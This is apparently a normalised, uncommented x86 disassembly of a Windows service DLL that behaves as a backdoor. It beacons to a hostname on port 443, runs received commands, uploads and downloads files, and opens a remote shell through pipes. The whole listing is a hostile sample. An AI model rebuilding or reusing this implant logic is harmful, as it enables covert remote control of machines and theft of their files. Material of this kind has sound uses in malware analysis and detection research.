sub_10001000
mov eax [ esp + 0x8 ]
sub eax 0x0
je r-xdata
push 0x0
mov eax 0x3
call sub_10001230
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
sub eax 0x1
je r-xdata
call [ WSACleanup@IAT ]
push 0x5dc
call [ Sleep@IAT ]
push 0x0
mov eax 0x1
call sub_10001230
add esp 0x4
mov eax 0x1
retn 0xc
push 0x0
push eax
call [ TerminateThread@IAT ]
push esi
mov esi [ esp + 0x8 ]
push 0x104
push 0x0
push rw-data
mov [ rw-data ] esi
call sub_10008c10
add esp 0xc
push 0x104
push rw-data
push esi
call [ GetModuleFileNameA@IAT ]
mov [ rw-data ] eax
pop esi
mov eax 0x1
retn 0xc
sub eax 0x2
mov eax 0x1
retn 0xc
ServiceMain
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x13c ] eax
push esi
mov esi [ esp + 0x14c ]
mov eax [ esi ]
push edi
push 0x100
push eax
lea ecx [ esp + 0x4c ]
push ecx
call sub_100026c0
mov edx [ esi ]
push 0x100
push edx
lea eax [ esp + 0x58 ]
push eax
call sub_10002aac
add esp 0x18
push sub_10001280
lea ecx [ esp + 0x48 ]
push ecx
call [ RegisterServiceCtrlHandlerA@IAT ]
xor edi edi
cmp eax edi
mov [ rw-data ] eax
je r-xdata
mov ecx [ esp + 0x144 ]
pop edi
pop esi
xor ecx esp
call sub_100026a8
add esp 0x140
retn 0x8
mov esi [ SetServiceStatus@IAT ]
push ebx
push ebp
lea edx [ esp + 0x14 ]
mov ecx 0x2
push edx
mov ebp 0x7
mov ebx 0xbb8
push eax
mov [ esp + 0x1c ] 0x10
mov [ rw-data ] ecx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x34 ] ebx
call esi
mov ecx [ rw-data ]
mov eax 0x4
mov [ rw-data ] eax
mov [ esp + 0x34 ] eax
lea eax [ esp + 0x30 ]
push eax
push ecx
mov [ esp + 0x38 ] 0x10
mov [ esp + 0x40 ] ebp
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] edi
mov [ esp + 0x50 ] ebx
call esi
mov esi [ CreateThread@IAT ]
lea edx [ esp + 0x10 ]
push edx
push edi
push edi
push sub_10001350
push edi
push edi
call esi
mov ebx [ TerminateThread@IAT ]
mov ebp [ CloseHandle@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push 0x927c0
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
mov eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
cmp ecx 0x3
je r-xdata
cmp eax edi
je r-xdata
cmp eax edi
je r-xdata
cmp ecx 0x1
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push edi
push edi
push sub_10001350
push edi
push edi
call esi
mov [ rw-data ] eax
push edi
push eax
call ebx
mov eax [ rw-data ]
push eax
call ebp
pop ebp
pop ebx
push edi
push eax
call ebx
mov edx [ rw-data ]
push edx
call ebp
sub_10001230
sub esp 0x1c
mov edx [ rw-data ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
xor eax eax
lea ecx [ esp ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x20 ]
push ecx
push edx
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_10001280
mov eax [ esp + 0x4 ]
add eax 0xffffffff
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_1000133c ]
push 0x1
mov eax 0x3
call sub_10001230
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
push 0x1
mov eax 0x6
call sub_10001230
push 0x0
mov eax 0x7
call sub_10001230
add esp 0x8
retn 0x4
push 0x1
mov eax 0x5
call sub_10001230
push 0x0
mov eax 0x4
call sub_10001230
add esp 0x8
retn 0x4
mov eax [ rw-data ]
push 0x0
call sub_10001230
add esp 0x4
retn 0x4
push 0x0
mov eax 0x1
call sub_10001230
pop ecx
push 0xa
call [ Sleep@IAT ]
push 0x0
mov eax 0x1
call sub_10001230
add esp 0x4
retn 0x4
push 0x0
push eax
call [ TerminateThread@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
sub_10001350
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1b4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1b0 ] eax
push ebx
push esi
mov esi [ WSAStartup@IAT ]
push edi
mov edi [ WSACleanup@IAT ]
lea esp [ esp ]
mov bl 0x1
call sub_100015d0
test al al
jne r-xdata
call edi
lea ecx [ esp + 0x28 ]
push ecx
push 0x202
call esi
test eax eax
je r-xdata
push 0x0
push 0x1
push 0x1
push 0x0
call [ CreateEventA@IAT ]
lea edx [ esp + 0x24 ]
push edx
push 0x0
push 0x0
push sub_100018f0
push 0x0
push 0x0
mov [ rw-data ] eax
call [ CreateThread@IAT ]
mov edi eax
push 0x1518
call sub_10001bb0
add esp 0x4
push 0x0
call sub_100034ef
add esp 0x4
push eax
call sub_100034c0
add esp 0x4
call sub_100034cd
xor edx edx
mov ecx 0x1518
div ecx
imul edx edx 0x3e8
push edx
call sub_10001bb0
add esp 0x4
push edx
call [ Sleep@IAT ]
jmp r-xdata
push 0x1c20
call sub_10001bb0
add esp 0x4
push 0x0
call sub_100034ef
add esp 0x4
push eax
call sub_100034c0
add esp 0x4
call sub_100034cd
xor edx edx
mov ecx 0x1c20
div ecx
imul edx edx 0x3e8
push edx
call sub_10001bb0
add esp 0x4
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_10001bb0
mov eax [ rw-data ]
add esp 0x4
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
call sub_10001b00
cmp eax 0x1
mov [ esp + 0x14 ] eax
jne r-xdata
lea eax [ esp + 0x28 ]
push eax
push 0x202
call esi
test eax eax
je r-xdata
push 0x0
push edi
call [ TerminateThread@IAT ]
mov esi [ CloseHandle@IAT ]
push edi
call esi
mov edx [ rw-data ]
push edx
call esi
jmp r-xdata
push 0x1
push eax
call [ shutdown@IAT ]
mov ecx [ rw-data ]
push ecx
call [ closesocket@IAT ]
mov [ rw-data ] 0xffffffff
cmp eax 0x6
je r-xdata
mov eax [ rw-data ]
add eax 0xffffffff
cmp eax 0x4
ja r-xdata
test bl bl
je r-xdata
jmp [ eax * 4 + jump_table_100015b4 ]
push rw-data
call sub_100019b0
add esp 0x4
jmp r-xdata
call sub_10002100
jmp r-xdata
push 0x0
push edi
call [ TerminateThread@IAT ]
mov eax [ rw-data ]
push 0x1
push eax
mov esi eax
call [ shutdown@IAT ]
push esi
call [ closesocket@IAT ]
push rw-data
xor bl bl
call sub_10002b6c
fmul [ r--data ]
fnstcw [ esp + 0x16 ]
add esp 0x4
movzx eax [ esp + 0x12 ]
or eax 0xc00
mov [ esp + 0x18 ] eax
fldcw [ esp + 0x18 ]
fistp [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
push eax
fldcw [ esp + 0x16 ]
call sub_10001bb0
add esp 0x4
test eax eax
jne r-xdata
mov ecx rw-data
call sub_10001bc0
jmp r-xdata
mov ecx rw-data
call sub_10001df0
jmp r-xdata
imul eax eax 0x3e8
push eax
call sub_10001bb0
add esp 0x4
push eax
call [ Sleep@IAT ]
jmp r-xdata
mov eax 0xe10
sub_100015d0
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
xor eax eax
push ebp
push esi
push edi
push eax
push 0x1
push 0x2
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x31 ] eax
mov [ esp + 0x35 ] eax
mov [ esp + 0x39 ] eax
mov [ esp + 0x3d ] eax
mov [ esp + 0x41 ] eax
mov [ esp + 0x45 ] eax
mov [ esp + 0x49 ] eax
mov [ esp + 0x4d ] ax
mov [ esp + 0x4f ] al
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor al al
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_100026a8
add esp 0x40
retn
mov edi [ WSAGetLastError@IAT ]
mov ebp [ Sleep@IAT ]
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov ecx [ eax ]
push ecx
call [ inet_ntoa@IAT ]
xor ecx ecx
lea edx [ esp + 0x24 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ecx
sub edx eax
push 0x2a30
call sub_10001bb0
add esp 0x4
push eax
call sub_100034ef
add esp 0x4
push eax
call sub_100034c0
add esp 0x4
call sub_100034cd
xor edx edx
mov ecx 0x2a30
div ecx
imul edx edx 0x3e8
push edx
call sub_10001bb0
add esp 0x4
push edx
call ebp
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
lea edx [ esp + 0x24 ]
push r--data
push edx
call sub_10002b80
lea ecx [ esp + 0x2c ]
add esp 0x8
cmp eax ecx
jne r-xdata
push r--data
call [ gethostbyname@IAT ]
test eax eax
jne r-xdata
push 0x1bb
mov [ esp + 0x18 ] 0x2
call [ htons@IAT ]
lea edx [ esp + 0x24 ]
push edx
mov [ esp + 0x1a ] ax
call [ inet_addr@IAT ]
mov [ esp + 0x18 ] eax
mov esi 0x1
mov edi edi
push 0x2a30
call sub_10001bb0
add esp 0x4
push 0x0
call sub_100034ef
add esp 0x4
push eax
call sub_100034c0
add esp 0x4
call sub_100034cd
xor edx edx
mov ecx 0x2a30
div ecx
imul edx edx 0x3e8
push edx
call sub_10001bb0
add esp 0x4
push edx
call ebp
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push 0x8004667e
push eax
call [ ioctlsocket@IAT ]
mov edx [ rw-data ]
push 0x4
lea ecx [ esp + 0x10 ]
push ecx
push 0xffffff7f
push 0xffff
push edx
call [ setsockopt@IAT ]
mov edi [ rw-data ]
push 0x2
push r--data
mov esi 0xb
call sub_10001a40
add esp 0x8
push 0x3e8
call ebp
mov esi [ rw-data ]
call sub_10001b00
cmp eax 0x2
je r-xdata
call edi
push eax
call sub_10001bb0
add esp 0x4
push 0x168
call sub_10001bb0
add esp 0x4
push 0x57e40
call sub_10001bb0
add esp 0x4
push 0x57e40
call ebp
add esi 0x1
cmp esi 0x3
jle r-xdata
push 0xb
push r--data
push rw-data
call sub_10002c06
add esp 0xc
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x1
push eax
call [ shutdown@IAT ]
mov ecx [ rw-data ]
push ecx
call [ closesocket@IAT ]
mov ecx [ rw-data ]
push 0x10
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x2a30
call sub_10001bb0
add esp 0x4
push 0x0
call sub_100034ef
add esp 0x4
push eax
call sub_100034c0
add esp 0x4
call sub_100034cd
xor edx edx
mov ecx 0x2a30
div ecx
imul edx edx 0x3e8
push edx
call sub_10001bb0
add esp 0x4
push edx
call ebp
jmp r-xdata
mov ecx [ esp + 0x44 ]
pop edi
pop esi
pop ebp
xor ecx esp
mov al 0x1
call sub_100026a8
add esp 0x40
retn
mov edx [ rw-data ]
push 0x1
push edx
call [ shutdown@IAT ]
mov eax [ rw-data ]
push eax
call [ closesocket@IAT ]
mov [ rw-data ] 0xffffffff
xor al al
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_100026a8
add esp 0x40
retn
sub_100018f0
push ebp
mov ebp esp
and esp 0xfffffff8
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push ebp
mov ebp [ ResetEvent@IAT ]
push esi
push edi
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
call [ shutdown@IAT ]
mov edx [ rw-data ]
push edx
call [ closesocket@IAT ]
push 0x0
mov [ rw-data ] 0xffffffff
call [ ExitThread@IAT ]
mov edx [ rw-data ]
push edx
call [ SetEvent@IAT ]
jmp r-xdata
push 0x5a
call sub_10001bb0
add esp 0x4
push 0x15f90
call sub_10001bb0
add esp 0x4
push 0x15f90
call [ Sleep@IAT ]
mov eax [ rw-data ]
push 0xffffffff
push eax
call ebx
mov ecx [ rw-data ]
push ecx
call ebp
mov edi [ rw-data ]
push 0x2
push r--data
mov esi 0xb
call sub_10001a40
add esp 0x8
test eax eax
je r-xdata
sub_100019b0
sub esp 0x58
push esi
push edi
mov edi [ rw-data ]
push 0x44
lea eax [ esp + 0x1c ]
push 0x0
push eax
call sub_10008c10
add esp 0xc
xor eax eax
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
push eax
push eax
push 0x10
push eax
push eax
push eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x84 ]
push eax
push 0x0
mov [ esp + 0x40 ] 0x44
call [ CreateProcessA@IAT ]
test eax eax
push 0x2
je r-xdata
push r--data
mov esi 0x7
call sub_10001a40
add esp 0x8
pop edi
pop esi
add esp 0x58
retn
push r--data
mov esi 0xa
call sub_10001a40
add esp 0x8
pop edi
pop esi
add esp 0x58
retn
sub_10001a40
sub esp 0x114
push 0x3fc
push 0x0
push rw-data
mov [ esp + 0xc ] 0x5
mov [ esp + 0x10 ] 0x0
call sub_10008c10
mov ecx [ esp + 0x124 ]
mov eax [ esp + 0x128 ]
push esi
push ecx
push rw-data
mov [ rw-data ] eax
call sub_10006dd0
add esp 0x18
lea edx [ esp ]
push edx
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x0
mov [ rw-data ] esi
mov [ esp + 0x20 ] edi
mov [ esp + 0x1c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
add esp 0x114
retn
lea ecx [ esp + 0x8 ]
push ecx
push edi
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x0
push 0x404
push rw-data
push edi
call [ send@IAT ]
mov ecx eax
sub eax 0xffffffff
neg eax
sbb eax eax
and eax ecx
add esp 0x114
retn
sub_10001b00
sub esp 0x114
push 0x3fc
push 0x0
push rw-data
mov [ esp + 0xc ] 0x5
mov [ esp + 0x10 ] 0x0
mov [ rw-data ] 0x0
call sub_10008c10
add esp 0xc
lea eax [ esp ]
push eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] 0x1
call [ select@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x8 ]
push edx
push esi
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax 0x6
add esp 0x114
retn
call [ WSAGetLastError@IAT ]
xor eax eax
add esp 0x114
retn
push 0x0
push 0x404
push rw-data
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
add esp 0x114
retn
sub_10001bc0
sub esp 0x224
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x21c ] eax
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov edi [ rw-data ]
push 0xffffffff
push eax
mov ebx ecx
mov [ esp + 0x20 ] edi
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ ResetEvent@IAT ]
push 0x2
push r--data
mov esi 0x7
call sub_10001a40
add esp 0x8
cmp [ ebx ] 0x0
mov ebp ebx
mov esi ebx
je r-xdata
push 0xff
lea edx [ esp + 0x12c ]
push 0x0
push edx
call sub_10008c10
mov eax ebp
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x12c ]
push ebp
push eax
call sub_100026c0
add esp 0xc
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push ebx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push esi
call sub_10002cc4
add esp 0x4
mov ebp eax
cmp al 0x2f
je r-xdata
lea edx [ esp + 0x1c ]
push edx
push ebx
call [ GetFileSize@IAT ]
push 0x104
mov ebp eax
lea eax [ esp + 0x24 ]
push 0x0
push eax
call sub_10008c10
add esp 0xc
xor eax eax
lea esp [ esp ]
push 0x2
push r--data
mov esi 0xf
call sub_10001a40
add esp 0x8
cmp eax ebx
jne r-xdata
mov al [ esi ]
cmp al 0x5c
je r-xdata
cmp al 0x3b
jne r-xdata
mov cl [ esp + eax + 0x128 ]
mov [ esp + eax + 0x24 ] cl
add eax 0x1
test cl cl
jne r-xdata
lea ecx [ esp + 0x20 ]
push 0x5
push ecx
mov esi 0x104
mov [ esp + 0x28 ] ebp
call sub_10001a40
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
push r--data
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + 0x1c ] r--data
call sub_1000fad2
push esi
call sub_10002cc4
mov esi eax
add esp 0x4
cmp [ esi ] 0x0
jne r-xdata
mov esi edi
call sub_10001b00
cmp eax 0xffffffff
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
push r--data
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x1c ] r--data
call sub_1000fad2
mov ecx 0x41
mov esi rw-data
lea edi [ esp + 0x20 ]
[ edi ] [ esi ]
mov esi [ esp + 0x20 ]
cmp esi ebp
jae r-xdata
push ebx
call [ CloseHandle@IAT ]
push r--data
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x1c ] r--data
call sub_1000fad2
test ebx ebx
je r-xdata
push 0x0
push 0x0
push esi
push ebx
call [ SetFilePointer@IAT ]
mov ecx [ esp + 0x18 ]
push 0x4
push 0x0
push 0x0
push 0x1000
sub ebp esi
push ebp
push ebx
push ecx
call TransmitFile
mov edx [ rw-data ]
push edx
call [ SetEvent@IAT ]
mov ecx [ esp + 0x22c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_100026a8
add esp 0x224
retn
push ebx
call [ CloseHandle@IAT ]
sub_10001df0
mov eax 0x143c
call sub_1000ea80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1434 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ rw-data ]
push ebp
push esi
push edi
xor edi edi
push 0xffffffff
push eax
mov esi ecx
mov [ esp + 0x20 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x28 ] 0x3c
mov [ esp + 0x2c ] edi
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ ResetEvent@IAT ]
lea edx [ esp + 0x340 ]
mov eax esi
sub edx esi
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
mov cl [ esp + 0x340 ]
xor eax eax
cmp cl 0x20
je r-xdata
lea edx [ esp + 0x340 ]
push r--data
push edx
mov [ esp + eax + 0x138 ] 0x0
call sub_10002b80
add eax 0x1
push r--data
push eax
mov [ esp + 0x2c ] eax
call sub_10002df3
mov ebp eax
add esp 0x10
cmp ebp edi
je r-xdata
lea ebx [ ebx ]
call [ GetLastError@IAT ]
push eax
call sub_10001bb0
add esp 0x4
push 0x2
push r--data
mov esi 0xf
mov edi ebx
call sub_10001a40
add esp 0x8
jmp r-xdata
push 0x2
push r--data
mov esi 0x7
mov edi ebx
call sub_10001a40
push 0x2
push 0x0
push ebp
call sub_10002e8d
add esp 0x14
push ebp
call sub_100030aa
add esp 0x4
push ebp
mov [ esp + 0x14 ] eax
mov [ esp + 0x23c ] eax
call sub_1000318b
add esp 0x4
mov esi ebx
call sub_10001b00
cmp eax 0xffffffff
jne r-xdata
mov [ esp + eax + 0x130 ] cl
mov cl [ esp + eax + 0x341 ]
add eax 0x1
cmp cl 0x20
jne r-xdata
mov edx [ rw-data ]
push edx
cmp eax 0x5
jne r-xdata
push r--data
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] r--data
call sub_1000fad2
test cl cl
je r-xdata
lea eax [ esp + 0x134 ]
lea edx [ eax + 0x1 ]
push 0x104
lea ecx [ esp + 0x23c ]
push 0x0
push ecx
call sub_10008c10
mov ecx 0x41
mov esi rw-data
lea edi [ esp + 0x13c ]
[ edi ] [ esi ]
mov edx [ esp + 0x13c ]
add esp 0xc
mov [ esp + 0x18 ] edx
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x138 ]
push eax
lea ecx [ esp + 0x244 ]
push ecx
call sub_10006dd0
add esp 0xc
lea edx [ esp + 0x238 ]
push 0x5
push edx
mov esi 0x104
mov edi ebx
call sub_10001a40
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
push r--data
push ecx
call sub_10002df3
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push r--data
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] r--data
call sub_1000fad2
mov edx [ esp + 0x10 ]
cmp edx [ esp + 0x18 ]
jge r-xdata
push edi
call sub_1000318b
mov ecx [ rw-data ]
add esp 0x4
push ecx
jmp r-xdata
mov ebp [ recv@IAT ]
nop
call [ SetEvent@IAT ]
mov ecx [ esp + 0x1444 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_100026a8
add esp 0x143c
retn
push edi
call sub_1000318b
add esp 0x4
cmp eax 0xffffffff
je r-xdata
lea edx [ esp + 0x28 ]
push edx
push ebx
call __WSAFDIsSet
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
sub edx [ esp + 0x10 ]
cmp [ esp + 0x14 ] edx
jl r-xdata
push 0x0
push 0x1000
lea eax [ esp + 0x448 ]
push eax
push ebx
call ebp
mov esi eax
cmp esi 0xffffffff
push edi
je r-xdata
lea eax [ esp + 0x20 ]
push eax
push 0x0
push 0x0
lea ecx [ esp + 0x34 ]
push ecx
push 0x0
mov [ esp + 0x40 ] ebx
mov [ esp + 0x3c ] 0x1
call [ select@IAT ]
test eax eax
jle r-xdata
call [ CloseHandle@IAT ]
push r--data
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x24 ] r--data
call sub_1000fad2
push esi
lea ecx [ esp + 0x448 ]
push 0x1
push ecx
call sub_10003321
add esp 0x10
add [ esp + 0x14 ] esi
sub_10002100
sub esp 0x1c
mov eax [ rw-data ]
push esi
push edi
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ ResetEvent@IAT ]
call sub_100024a0
mov edx [ rw-data ]
mov esi [ CreateThread@IAT ]
xor edi edi
lea eax [ esp + 0x8 ]
push eax
push edi
push rw-data
push sub_10002290
push edi
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] 0xc
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov [ rw-data ] edx
call esi
cmp eax edi
mov [ rw-data ] eax
je r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
lea edx [ esp + 0x8 ]
push edx
push edi
push rw-data
push sub_100023c0
push edi
lea eax [ esp + 0x20 ]
push eax
call esi
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
mov edx [ rw-data ]
push 0xffffffff
push edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x24 ] eax
mov eax [ rw-data ]
push ecx
push 0x3
mov [ esp + 0x28 ] edx
mov [ esp + 0x30 ] eax
call [ WaitForMultipleObjects@IAT ]
sub eax edi
je r-xdata
mov ecx [ rw-data ]
push edi
push ecx
call [ TerminateThread@IAT ]
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
mov eax [ rw-data ]
push edi
push eax
call [ TerminateThread@IAT ]
mov ecx [ rw-data ]
push 0x1
push ecx
sub eax 0x1
je r-xdata
mov ecx [ rw-data ]
push edi
push ecx
call [ TerminateThread@IAT ]
mov edx [ rw-data ]
push 0x1
push edx
jmp r-xdata
sub eax 0x1
jne r-xdata
call [ TerminateProcess@IAT ]
mov edx [ rw-data ]
mov edi [ DisconnectNamedPipe@IAT ]
push edx
call edi
mov eax [ rw-data ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call edi
mov edx [ rw-data ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov edx [ rw-data ]
mov esi [ TerminateThread@IAT ]
push edi
push edx
call esi
mov eax [ rw-data ]
push edi
push eax
call esi
jmp r-xdata
sub_10002290
sub esp 0x820
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x81c ] eax
push ebx
push ebp
push esi
push edi
push 0x1c
xor bl bl
mov [ esp + 0x14 ] 0x0
call sub_100033fd
mov esi [ esp + 0x838 ]
mov ebp eax
push 0x3fc
lea eax [ esp + 0x1c ]
push 0x0
mov ecx 0x7
mov edi ebp
push eax
[ edi ] [ esi ]
call sub_10008c10
mov eax [ ebp ]
add esp 0x10
push 0x0
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push 0x3fc
lea edx [ esp + 0x24 ]
push edx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x82c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_100026a8
add esp 0x820
retn
cmp [ esp + 0x10 ] 0x0
jbe r-xdata
push 0x32
call [ Sleep@IAT ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebp ]
push 0x3fc
lea ecx [ esp + 0x20 ]
push ecx
push eax
call [ ReadFile@IAT ]
mov edi [ esp + 0x10 ]
xor eax eax
xor esi esi
test edi edi
jbe r-xdata
mov edi [ ebp + 0xc ]
lea edx [ esp + 0x410 ]
push 0x3
push edx
call sub_10001a40
add esp 0x8
test eax eax
je r-xdata
mov cl [ esp + eax + 0x14 ]
cmp cl 0xa
jne r-xdata
jmp r-xdata
mov [ esp + esi + 0x410 ] cl
add eax 0x1
add esi 0x1
cmp eax edi
mov bl cl
jb r-xdata
cmp bl 0xd
je r-xdata
mov edx [ ebp ]
push 0x0
push 0x0
lea eax [ esp + 0x18 ]
push eax
push 0x3fc
lea ecx [ esp + 0x24 ]
push ecx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
mov [ esp + esi + 0x410 ] 0xd
add esi 0x1
sub_100023c0
sub esp 0x410
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40c ] eax
push ebx
push ebp
push esi
push edi
push 0x1c
mov [ esp + 0x14 ] 0x0
call sub_100033fd
mov esi [ esp + 0x428 ]
mov ebx [ WriteFile@IAT ]
mov ebp eax
mov ecx 0x7
mov edi ebp
[ edi ] [ esi ]
mov esi [ ebp + 0xc ]
add esp 0x4
jmp r-xdata
push 0x3fc
push 0x0
push rw-data
mov [ rw-data ] 0x0
call sub_10008c10
add esp 0xc
call sub_10001b00
cmp eax 0x6
je r-xdata
push 0x406
lea eax [ esp + 0x18 ]
push 0x0
push eax
call sub_10008c10
mov edi [ rw-data ]
push edi
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
mov [ esp + 0x28 ] edi
call sub_10006dd0
mov ecx [ ebp + 0x4 ]
add esp 0x18
push 0x0
mov [ esp + edi + 0x18 ] 0xd
lea edx [ esp + 0x14 ]
push edx
mov [ esp + edi + 0x1d ] 0xa
add edi 0x2
push edi
lea eax [ esp + 0x20 ]
push eax
push ecx
call ebx
test eax eax
jne r-xdata
push eax
call [ ExitThread@IAT ]
sub_100024a0
sub esp 0x14
push esi
mov esi [ CreatePipe@IAT ]
xor eax eax
push edi
xor edi edi
mov [ rw-data ] eax
mov [ rw-data ] eax
push edi
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
mov [ esp + 0x1c ] edi
mov [ esp + 0x18 ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ esp + 0x20 ] 0xc
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] 0x1
call esi
test eax eax
jne r-xdata
push edi
lea edx [ esp + 0x14 ]
push edx
push rw-data
lea eax [ esp + 0x18 ]
push eax
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax edi
mov esi [ CloseHandle@IAT ]
je r-xdata
mov ecx [ esp + 0xc ]
mov edi [ esp + 0x8 ]
push ecx
call sub_100025c0
mov edx [ esp + 0x10 ]
mov esi [ CloseHandle@IAT ]
add esp 0x4
push edx
mov [ rw-data ] eax
call esi
mov eax [ esp + 0x8 ]
push eax
call esi
mov eax [ rw-data ]
cmp eax edi
mov esi [ CloseHandle@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax edi
je r-xdata
push eax
call esi
mov eax [ esp + 0x8 ]
cmp eax edi
je r-xdata
push eax
call esi
pop edi
pop esi
add esp 0x14
retn
push eax
call esi
pop edi
pop esi
add esp 0x14
retn
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
